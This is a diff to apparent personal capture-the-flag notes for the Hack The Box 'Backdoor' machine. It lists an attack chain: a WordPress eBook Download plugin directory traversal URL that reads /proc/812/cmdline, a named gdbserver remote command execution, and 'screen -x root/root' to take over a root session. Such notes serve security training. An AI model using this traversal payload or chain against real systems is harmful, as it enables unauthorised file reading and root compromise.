@@ -127,9 +127,10 @@ screen 4.5.0
 # Lin-Backdoor
 https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html
 ```
-nmap -p- 10.10.11.125
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://backdoor.htb/wp-content/FUZZ -e .aspx,.php,.txt,.html
-WP Plugins-EbookDL Dir Trav
-gdbserver RCE
-ps & screen
+http://10.10.11.125/wp-content/plugins/
+WordPress Plugin eBook Download 1.1 - Directory Traversal
+http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/812/cmdline
+GNU gdbserver 9.2 - Remote Command Execution (RCE)
+ps aux
+screen -x root/root
 ```
